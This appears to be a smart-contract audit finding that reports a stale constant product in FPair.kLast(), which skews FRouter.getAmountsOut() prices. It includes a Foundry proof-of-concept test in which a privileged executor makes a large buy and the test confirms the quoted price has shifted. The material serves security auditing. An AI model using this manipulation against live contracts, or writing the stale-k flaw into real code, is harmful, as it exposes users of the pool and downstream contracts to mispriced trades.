  "body": "## Finding description and impact\n\nFRouter.getAmountsOut computes price strictly from current reserves and constant-product K without any stabilization or TWAP smoothing.\n\nThe FPair.kLast() function erroneously returns the initial constant product value because FPair.swap() does not update _pool.k with the product of the new reserves. This causes FRouter.getAmountsOut() to use a stale k alongside current reserves, leading to fundamentally incorrect price calculations after any trade. While reserve-altering operations are restricted to the EXECUTOR_ROLE, this design flaw makes the getAmountsOut view function an unreliable oracle for any observer or downstream contract, presenting a risk beyond simple privilege misuse as the reported price is persistently inaccurate.\n\nThe direct \"attack\" of skewing reserves is performed by a privileged EXECUTOR_ROLE. Assuming this role is fully trusted and its actions are always considered beneficial or by design, one might argue for a lower severity (like QA for centralization risk: \"Direct misuse of privileges shall be submitted in the QA report\"). However, the oracle getAmountsOut is a public view function. Anyone can read this skewed price after an executor's trade. The fundamental brokenness of kLast means the oracle is unreliable regardless of intent. \n\n\n## Recommended mitigation steps\n\nThe core mitigation is to correct the FPair.swap() function to update _pool.k to _reserve0 * _reserve1 after each trade, ensuring kLast() reflects the true current state of the pool. This will allow FRouter.getAmountsOut() to compute prices based on an accurate constant product. For critical downstream functions requiring greater price stability and manipulation resistance, implementing a Time-Weighted Average Price (TWAP) oracle is strongly recommended. Additionally, all contracts relying on this oracle should be reviewed to confirm if the corrected spot price suffices or if a TWAP integration is needed.",
  "proof_of_concept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n// Project contracts\nimport \"contracts/fun/FRouter.sol\";\nimport \"contracts/fun/FFactory.sol\";\nimport \"contracts/fun/IFPair.sol\";\nimport \"contracts/fun/FERC20.sol\";\n// OpenZeppelin contracts\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/proxy/Clones.sol\";\n\ncontract StaleKPOC is Test {\n    FRouter public router; // Will point to proxy\n    FFactory public factory; // Will point to proxy\n    FERC20 public tokenA;\n    FERC20 public assetToken; \n    IFPair public pair;\n    address public pairAddress;\n    \n    address public owner;\n    \n    address public factoryImplAddr; \n    address public routerImplAddr;  \n    uint256 public constant INITIAL_SUPPLY_UNITS = 1_000_000_000;\n    uint256 public constant MAX_TX_PERCENT = 100; \n    uint256 public constant INITIAL_LIQUIDITY_TOKEN_A = 100_000 ether;\n    uint256 public constant INITIAL_LIQUIDITY_ASSET_TOKEN = 100_000 ether;\n    \n    function setUp() public {\n        owner = address(this); \n        assetToken = new FERC20(\"Asset Token\", \"AST\", INITIAL_SUPPLY_UNITS, MAX_TX_PERCENT);\n        tokenA = new FERC20(\"Token A\", \"TKA\", INITIAL_SUPPLY_UNITS, MAX_TX_PERCENT);\n        factoryImplAddr = address(new FFactory()); \n        address factoryProxyAddress = Clones.clone(factoryImplAddr);\n        factory = FFactory(factoryProxyAddress); \n        vm.prank(owner);\n        factory.initialize(owner, 1, 0);\n        routerImplAddr = address(new FRouter()); \n        address routerProxyAddress = Clones.clone(routerImplAddr);\n        router = FRouter(routerProxyAddress); \n        vm.prank(owner);\n        router.initialize(address(factory), address(assetToken));\n        vm.startPrank(owner);\n        factory.grantRole(factory.ADMIN_ROLE(), owner);\n        factory.grantRole(factory.CREATOR_ROLE(), owner);\n        router.grantRole(router.EXECUTOR_ROLE(), owner);\n        vm.stopPrank();\n        vm.prank(owner);\n        factory.setRouter(address(router));\n        vm.prank(owner);\n        pairAddress = factory.createPair(address(tokenA), address(assetToken));\n        pair = IFPair(pairAddress);\n        vm.prank(owner); \n        tokenA.approve(address(router), INITIAL_LIQUIDITY_TOKEN_A);\n        vm.prank(owner);\n        router.addInitialLiquidity(address(tokenA), INITIAL_LIQUIDITY_TOKEN_A, INITIAL_LIQUIDITY_ASSET_TOKEN);\n        uint256 k_initial = pair.kLast();\n        assertEq(k_initial, INITIAL_LIQUIDITY_TOKEN_A * INITIAL_LIQUIDITY_ASSET_TOKEN, \"Initial K (kLast) mismatch\");\n    }\n    function test_ManipulatePrice_ByLargeBuyOfTokenA() public {\n        uint256 amountInAssetForPriceQuote = 1 ether;\n        (uint256 reserveA_before, uint256 reserveB_before) = pair.getReserves();\n        uint256 k_before = pair.kLast();\n        console.log(\"--- Before Manipulation ---\");\n        console.log(\"Pair Address:\", pairAddress);\n        console.log(\"Initial Reserve A (TokenA in pair an FPair concept):\", reserveA_before);\n        console.log(\"Initial Reserve B (AssetToken in pair an FPair concept):\", reserveB_before);\n        console.log(\"Initial Actual TokenA balance of pair contract:\", tokenA.balanceOf(pairAddress));\n        console.log(\"Initial Actual AssetToken balance of pair contract:\", assetToken.balanceOf(pairAddress)); \n        console.log(\"Initial K (kLast from FPair):\", k_before);\n        uint256 amountTokenA_out_before = router.getAmountsOut(address(tokenA), address(assetToken), amountInAssetForPriceQuote);\n        console.log(\"For\", amountInAssetForPriceQuote, \"AssetToken (input), you get (TokenA output) [Before]:\", amountTokenA_out_before);\n        uint256 manipulationInvestmentAssetToken = 50_000 ether; \n        vm.startPrank(owner);\n        assetToken.approve(address(router), manipulationInvestmentAssetToken);\n        console.log(\"Owner (manipulator) AssetToken balance before large buy:\", assetToken.balanceOf(owner));\n        console.log(\"Owner (manipulator) TokenA balance before large buy:\", tokenA.balanceOf(owner));\n        (uint256 assetInRoutedAndTaxed, uint256 tokenAOutRouted) = router.buy(manipulationInvestmentAssetToken, address(tokenA), owner);\n        console.log(\"Large buy by owner: AssetToken In (after tax) to router for swap logic:\", assetInRoutedAndTaxed, \"TokenA Out from router to owner:\", tokenAOutRouted);\n        vm.stopPrank();\n        (uint256 reserveA_after, uint256 reserveB_after) = pair.getReserves();\n        uint256 k_after = pair.kLast();\n        console.log(\"--- After Manipulation (Large Buy of TokenA by Owner) ---\");\n        console.log(\"Reserve A (TokenA in pair an FPair concept):\", reserveA_after); \n        console.log(\"Reserve B (AssetToken in pair an FPair concept):\", reserveB_after); \n        console.log(\"Actual TokenA balance of pair contract:\", tokenA.balanceOf(pairAddress));\n        console.log(\"Actual AssetToken balance of pair contract:\", assetToken.balanceOf(pairAddress)); \n        console.log(\"K (kLast from FPair):\", k_after);\n        assertTrue(reserveA_after < reserveA_before, \"Reserve A (TokenA) in FPair should decrease after large buy of TokenA.\");\n        assertTrue(reserveB_after > reserveB_before, \"Reserve B (AssetToken) in FPair should increase after large buy of TokenA.\");\n        assertEq(k_after, k_before, \"K (kLast) should remain constant as it's only set at FPair.mint time and FPair.swap does not update it.\");\n        uint256 amountTokenA_out_after = router.getAmountsOut(address(tokenA), address(assetToken), amountInAssetForPriceQuote);\n        console.log(\"For\", amountInAssetForPriceQuote, \"AssetToken (input), you get (TokenA output) [After]:\", amountTokenA_out_after);\n        assertTrue(amountTokenA_out_after < amountTokenA_out_before, \"Price manipulation failed: Output of TokenA should be less after it became more expensive due to the large buy and stale kLast.\");\n        console.log(\"Price manipulation successful: Output of TokenA for 1 AssetToken changed from\", amountTokenA_out_before, \"to\", amountTokenA_out_after);\n    }\n}",
